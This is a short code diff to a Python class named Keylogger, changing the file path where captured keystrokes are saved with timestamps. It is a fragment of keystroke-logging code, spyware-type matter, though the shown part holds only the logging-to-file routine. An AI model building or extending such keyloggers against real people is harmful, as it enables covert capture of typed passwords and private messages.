@@ -9,7 +9,8 @@ class Keylogger:
     def save_keystrokes(self):
         if self.keystrokes:
             current_time = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
-            with open('keystrokes.txt', 'a') as f:
+            keygrab_file = "../Logs/keystrokes.txt"
+            with open(keygrab_file, 'a') as f:
                 for key in self.keystrokes:
                     f.write(f"{current_time} - {key}\n")
             self.keystrokes.clear()
